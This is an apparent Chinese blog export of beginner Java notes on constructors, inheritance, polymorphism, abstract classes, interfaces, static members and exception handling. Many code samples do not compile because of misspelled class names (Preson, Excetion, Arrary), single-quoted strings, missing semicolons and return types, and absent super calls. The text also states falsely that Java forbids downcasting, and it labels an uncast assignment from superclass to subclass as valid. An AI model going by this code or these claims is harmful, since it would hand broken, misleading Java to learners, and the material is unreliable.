<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>()</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name)</span></span>&#123; <span class="comment">//调用Person(String, int)构造方法</span></span><br><span class="line">        <span class="keyword">this</span>(name, <span class="number">18</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(<span class="string">&#x27;Unnamed&#x27;</span>) <span class="comment">//调用Person(String)构造方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="方法重载">方法重载</h3>
<p>在一个类中，我们可以定义多个方法。如果有一系列方法，它们的功能都是类似的，只有参数有所不同，那么，可以把这一组方法名做成<strong>同名</strong>方法。这种方法名相同，但各自的参数不同，称为方法重载（<code>Overload</code>）。</p>
<p>注意：<strong>方法重载的返回值类型通常都是相同的</strong>。</p>
<h3 id="继承">继承</h3>
<p><code>protected</code>允许子类访问父类的字段和方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Student s = <span class="keyword">new</span> Student(<span class="string">&quot;Xiao Ming&quot;</span>, <span class="number">18</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> String name;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> age;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, <span class="keyword">int</span> age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> score;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name, <span class="keyword">int</span> age, <span class="keyword">int</span> score)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.score = score;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行上面的代码，会得到一个编译错误，大意是在<code>Student</code>的构造方法中，无法调用<code>Person</code>的构造方法。这是因为在Java中，任何<code>class</code>的构造方法，第一行语句必须是调用父类的构造方法。如果没有明确地调用父类的构造方法，编译器会帮我们自动加一句<code>super();</code></p>
<p>但是，<code>Person</code>类并没有无参数的构造方法，因此，编译失败。解决方法是调用<code>Person</code>类存在的某个构造方法。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> score;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name, <span class="keyword">int</span> age, <span class="keyword">int</span> score)</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(name, age);</span><br><span class="line">        <span class="keyword">this</span>.score = score;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>结论：</strong></p>
<ol>
<li>如果父类没有默认的构造方法，子类就必须显式调用<code>super()</code>并给出参数以便让编译器定位到父类的一个合适的构造方法。</li>
<li>子类不会继承任何父类的构造方法。子类默认的构造方法是编译器自动生成的，不是继承的。</li>
</ol>
<p>Java允许向上转型，不允许向下转型：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Person p1 = <span class="keyword">new</span> Student(); <span class="comment">//upcasting ok</span></span><br><span class="line">Person p2 = <span class="keyword">new</span> Preson();</span><br><span class="line">Student s1 = p1; <span class="comment">// ok</span></span><br><span class="line">Student s2 = p2 <span class="comment">//error</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="多态">多态</h3>
<p><strong>定义：多态是指，针对某个类型的方法调用，其真正执行的方法取决于运行时期实际类型的方法。</strong></p>
<p>举个例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> class <span class="title">Main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="comment">// 给一个有普通收入、工资收入和享受国务院特殊津贴的小伙伴算税:</span></span><br><span class="line">        Income[] incomes = <span class="keyword">new</span> Income[] &#123;</span><br><span class="line">            <span class="keyword">new</span> Income(<span class="number">3000</span>),</span><br><span class="line">            <span class="keyword">new</span> Salary(<span class="number">5000</span>),</span><br><span class="line">            <span class="keyword">new</span> StateCouncilSpecialAllowance(<span class="number">15000</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        System.out.println(totalTax(incomes));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">double</span> <span class="title">totalTax</span><span class="params">(Income[] incomes)</span></span>&#123;</span><br><span class="line">        <span class="keyword">double</span> total = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(Income income: incomes)&#123;</span><br><span class="line">            total += income.getTax();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> total;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Income</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">double</span> income;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Income</span><span class="params">(<span class="keyword">double</span> income)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.income = income;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getTax</span><span class="params">(<span class="keyword">double</span> income)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> income * <span class="number">0.1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Salary</span> <span class="keyword">extends</span> <span class="title">Income</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Salary</span><span class="params">(<span class="keyword">double</span> income)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.income = income;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">getTax</span><span class="params">(<span class="keyword">double</span> income)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (income &lt;= <span class="number">5000</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (income - <span class="number">5000</span>) * <span class="number">0.2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StateCouncilSpecialAllowance</span> <span class="keyword">extends</span> <span class="title">Income</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">StateCouncilSpecialAllowance</span><span class="params">(<span class="keyword">double</span> income)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.income = income;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">getTax</span><span class="params">(<span class="keyword">double</span> income)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>继承可以允许子类覆写父类的方法。如果一个父类不允许子类对它的某个方法进行覆写，可以把该方法标记为<code>final</code>；如果一个类不希望任何其他类继承自它，那么可以把这个类本身标记为<code>final</code>；对于一个类的实例字段，同样可以用<code>final</code>修饰。用<code>final</code>修饰的字段在初始化后不能被修改。</p>
<h3 id="抽象类">抽象类</h3>
<p>如果父类的方法本身不需要实现任何功能，仅仅是为了定义方法签名，目的是让子类去覆写它，那么，可以把父类的方法声明为抽象方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>必须把<code>Person</code>类本身也声明为<code>abstract</code>，才能正确编译它：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>无法实例化的抽象类有什么用？</p>
<p>因为抽象类本身被设计成只能用于被继承，因此，抽象类可以强迫子类实现其定义的抽象方法，否则编译会报错。因此，抽象方法实际上相当于定义了“规范”。</p>
<h3 id="接口">接口</h3>
<p>抽象类和接口的对比如下：</p>
<table>
<thead>
<tr>
<th style="text-align:left"></th>
<th style="text-align:left">abstract class</th>
<th style="text-align:left">interface</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">继承</td>
<td style="text-align:left">只能extends一个class</td>
<td style="text-align:left">可以implements多个interface</td>
</tr>
<tr>
<td style="text-align:left">字段</td>
<td style="text-align:left">可以定义实例字段</td>
<td style="text-align:left">不能定义实例字段</td>
</tr>
<tr>
<td style="text-align:left">抽象方法</td>
<td style="text-align:left">可以定义抽象方法</td>
<td style="text-align:left">可以定义抽象方法</td>
</tr>
<tr>
<td style="text-align:left">非抽象方法</td>
<td style="text-align:left">可以定义非抽象方法</td>
<td style="text-align:left">可以定义default方法</td>
</tr>
</tbody>
</table>
<h4 id="default方法">default方法</h4>
<p>在接口中，可以定义<code>default</code>方法。例如，把<code>Person</code>接口的<code>run()</code>方法改为<code>default</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> class <span class="title">Main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        Person p = <span class="keyword">new</span> Student(<span class="string">&#x27;Xiao Ming&#x27;</span>);</span><br><span class="line">        p.run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Person</span>() </span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">getName</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(getName() + <span class="string">&quot; run&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Person</span>() </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>实现类可以不必覆写<code>default</code>方法。<code>default</code>方法的目的是，当我们需要给接口新增一个方法时，会涉及到修改全部子类。如果新增的是<code>default</code>方法，那么子类就不必全部修改，只需要在需要覆写的地方去覆写新增方法。</p>
<h3 id="静态字段和静态方法">静态字段和静态方法</h3>
<h4 id="静态字段">静态字段</h4>
<p>静态字段定义：<code>static field</code></p>
<p><strong>静态字段并不属于实例，所有实例共享一个静态字段，所以无论修改哪个实例的静态字段，效果都是一样的：所有实例的静态字段都被修改了。</strong></p>
<p>在代码中，实例对象能访问静态字段只是因为编译器可以根据实例类型自动转换为<code>类名.静态字段</code>来访问静态对象。所以，推荐用类名来访问静态字段。</p>
<h4 id="静态方法">静态方法</h4>
<p>调用实例方法必须通过一个实例变量，而调用静态方法则不需要实例变量，通过类名就可以调用。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        Person.setNumber(<span class="number">99</span>);</span><br><span class="line">        System.out.println(Person.number);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> number;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setNumber</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">        number = value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>静态方法属于类而不属于实例，因此，静态方法内部无法访问<code>this</code>变量，也无法访问实例字段，只能访问静态字段。</p>
<h4 id="接口的静态字段">接口的静态字段</h4>
<p><code>interface</code>是一个纯抽象类，所以不能定义实例字段。但是<code>interface</code>可以有静态字段，并且静态字段必须为<code>final</code>类型。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MALE = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> FEMALE = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>但是，<code>interface</code>的字段只能是<code>public static final</code>类型，所以我们可以把这些修饰符都去掉，编译器会自动加上。</p>
]]></content>
      <categories>
        <category>编程</category>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java基础学习之异常处理</title>
    <url>/Java/code/4.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/</url>
    <content><![CDATA[<h1 id="Java基础学习之异常处理">Java基础学习之异常处理</h1>
<h3 id="Java的异常">Java的异常</h3>
<p>Java标准库中常用的异常：</p>
<p><img src="https://i.loli.net/2019/10/12/Gz1ADtnZfLQ5cqv.png" alt=""></p>
<p>异常是一种<code>class</code>，它的继承关系如下：</p>
<p><img src="https://i.loli.net/2019/10/12/xOASH6aQmposulC.png" alt=""></p>
<p><code>Throwable</code>有两个子类：<code>Error</code>和<code>Exception</code>。</p>
<p><code>Error</code>表示严重的错误，例如：</p>
<ul>
<li><code>OutOfMemoryError</code>：内存耗尽</li>
<li><code>NoClassDefFountError</code>：无法加载某个Class</li>
<li><code>StackOverflowError</code>：栈溢出</li>
</ul>
<p><code>Exception</code>表示运行时错误，它可以被捕获并处理。</p>
<p>程序逻辑处理相关：</p>
<ul>
<li><code>NumberFormatException</code>：数值类型的格式错误</li>
<li><code>FileNotFoundException</code>：未找到文件</li>
<li><code>SocketException</code>：读取网络失败</li>
</ul>
<p>以及程序逻辑编写错误：</p>
<ul>
<li><code>NullPointerException</code>：对某个<code>null</code>的对象调用方法或字段</li>
<li><code>IndexOutOfBoundsException</code>：数组索引越界</li>
</ul>
<p>Java规定：</p>
<ul>
<li>必须捕获的异常包括：<code>Exception</code>及其子类，除了<code>RuntimeExcetion</code>及其子类。</li>
<li>不需要捕获的异常包括：<code>Error</code>及其子类，<code>RuntimeExcetion</code>及其子类。</li>
</ul>
<h3 id="捕获异常">捕获异常</h3>
<p>捕获异常使用<code>try...catch</code>语句，把可能发生异常的代码放到<code>try &#123;...&#125;</code>中，然后使用<code>catch</code>捕获对应的<code>Exception</code>及其子类 ：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bs = toGBK(<span class="string">&quot;中文&quot;</span>);</span><br><span class="line">        System.out.println(Arrary.toString(bs));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">byte</span>[] toGBK(String s) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> s.getBytes(<span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">            System.out.println(e);</span><br><span class="line">            <span class="keyword">return</span> s.getBytes(); <span class="comment">//使用默认编码</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="comment">// [-42, -48, -50, -60]</span></span><br></pre></td></tr></table></figure>
<p>如果我们不捕获<code>UnsupportedEncodingException</code>，则会出现编译失败，这是因为<code>String.getBytes()</code>方法的定义是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] getBytes(String charsetName) <span class="keyword">throws</span> UnsupportedEncodingException &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以调用方在调用的时候，必须强制捕获这些异常，否则编译器会报错。</p>
<h4 id="多catch语句">多catch语句</h4>
<p>可以使用多个<code>catch</code>语句，每个<code>catch</code>捕获相对应的异常，但是，<strong>多个<code>catch</code>语句只有一个能被执行</strong>。所以存在多个<code>catch</code>时候，<code>catch</code>的顺序非常重要：<strong>子类必须写在前面</strong>。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOExcetion c) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;IO error&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123; <span class="comment">// 永远捕获不到</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Bad encoding&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为<code>UnsupportedEncodingException</code>是<code>IOExcetion</code>的子类，所以当抛出<code>UnsupportedEncodingException</code>异常时，会被<code>catch (IOException e) &#123; ... &#125;</code>捕获并执行。</p>
<h4 id="finally语句">finally语句</h4>
<p>无论是否有异常发生，如果我们都希望执行一些语句，可以使用<code>finally</code>语句，例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        process1();</span><br><span class="line">        process2();</span><br><span class="line">        process3();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Bad encoding&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;IO error&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;END&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果某些异常的处理逻辑相同，但是异常本身不存在继承关系，我们可以使用<code>|</code>来合并：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        process1();</span><br><span class="line">        process2();</span><br><span class="line">        process3();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException | NumberFormatException e) &#123; <span class="comment">// IOException或NumberFormatException</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Bad input&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Unknown error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="抛出异常">抛出异常</h3>
<p>抛出异常分为两步：</p>
<ol>
<li>创建某个<code>Excetion</code>实例；</li>
<li>用<code>throw</code>语句抛出。</li>
</ol>
<p>例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerExcetion();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="异常转换">异常转换</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process1</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        process2();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NullPointerExcetion e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentExcement;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process2</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s==<span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NullPonterExcetion();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当<code>process2()</code>抛出<code>NullPointerException</code>后，被<code>process1()</code>捕获，然后抛出<code>IllegalArgumentException()</code>。</p>
<p>如果在<code>main()</code>中捕获<code>IllegalArgumentException</code>，我们看看打印的异常栈：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            process1();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">process1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            process2();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NullPointerException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">process2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>异常栈如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.lang.IllegalArgumentException</span><br><span class="line">    at Main.process1(Main.java:15)</span><br><span class="line">    at Main.main(Main.java:5)</span><br><span class="line">    at java.base&#x2F;jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class="line">    at java.base&#x2F;jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">    at java.base&#x2F;jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">    at java.base&#x2F;java.lang.reflect.Method.invoke(Method.java:567)</span><br><span class="line">    at jdk.compiler&#x2F;com.sun.tools.javac.launcher.Main.execute(Main.java:415)</span><br><span class="line">    at jdk.compiler&#x2F;com.sun.tools.javac.launcher.Main.run(Main.java:192)</span><br><span class="line">    at jdk.compiler&#x2F;com.sun.tools.javac.launcher.Main.main(Main.java:132)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>我们已经看不到原始异常<code>NullPointerException</code>的信息了。  为了能追踪到完整的异常栈，在构造异常的时候，把原始的<code>Exception</code>实例传进去，新的<code>Exception</code>就可以持有原始<code>Exception</code>信息。 即：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">process1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            process2();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NullPointerException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>异常栈如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.lang.IllegalArgumentException: java.lang.NullPointerException</span><br><span class="line">    at Main.process1(Main.java:15)</span><br><span class="line">    at Main.main(Main.java:5)</span><br><span class="line">Caused by: java.lang.NullPointerException</span><br><span class="line">    at Main.process2(Main.java:20)</span><br><span class="line">    at Main.process1(Main.java:13)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="自定义异常">自定义异常</h3>
<p>一个常见的做法是自定义一个<code>BaseException</code>作为“根异常”，然后，派生出各种业务类型的异常。</p>
<p><code>BaseException</code>需要从一个适合的<code>Exception</code>派生，通常建议从<code>RuntimeException</code>派生：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseException</span> <span class="keyword">extends</span> <span class="title">RuntimeExcetion</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>其他业务类型的异常就可以从<code>BaseException</code>派生：</p>
